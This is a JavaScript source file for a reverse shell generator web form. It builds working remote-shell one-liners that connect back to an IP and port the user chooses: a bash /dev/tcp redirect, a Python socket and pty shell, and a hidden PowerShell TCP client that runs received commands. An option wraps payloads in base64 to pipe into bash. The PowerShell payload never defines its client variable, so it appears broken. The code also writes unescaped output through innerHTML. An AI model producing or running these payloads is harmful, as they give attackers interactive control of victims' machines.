const form = document.getElementById("reverseShellForm");
const osSelect = document.getElementById("os");
const shellTypeSelect = document.getElementById("shellType");
const ipInput = document.getElementById("ip");
const portInput = document.getElementById("port");
const encodingSelect = document.getElementById("encoding");
const preview = document.getElementById("preview");

form.addEventListener("submit", function (e) {
  e.preventDefault();

  const os = osSelect.value;
  const shell = shellTypeSelect.value;
  const ip = ipInput.value;
  const port = portInput.value;
  const encoding = encodingSelect.value;

  if (!ip || !port) {
    preview.innerHTML = "<span style='color:red'>IP and Port are required.</span>";
    return;
  }

  const rawPayload = generatePayload(os, shell, ip, port);
  if (!rawPayload) {
    preview.innerHTML = "<span style='color:red'>Invalid payload configuration.</span>";
    return;
  }

  let encoded;
  if (encoding === "base64") {
    encoded = `echo ${btoa(rawPayload)} | base64 -d | bash`;
  } else if (encoding === "url") {
    encoded = encodeURIComponent(rawPayload);
  } else {
    encoded = rawPayload;
  }

  preview.innerHTML = `<code>${encoded}</code>`;
});

function generatePayload(os, shell, ip, port) {
  if (os === "Linux" || os === "Mac") {
    switch (shell) {
      case "bash":
        return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
      case "Python":
        return `python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("${ip}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn("/bin/bash")'`;
      case "PowerShell":
        return `echo 'PowerShell is not supported on Linux/Mac'`;
      default:
        return "";
    }
  } else if (os === "Windows") {
    switch (shell) {
      case "PowerShell":
        return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"`;
      default:
        return "";
    }
  }
  return "";
}
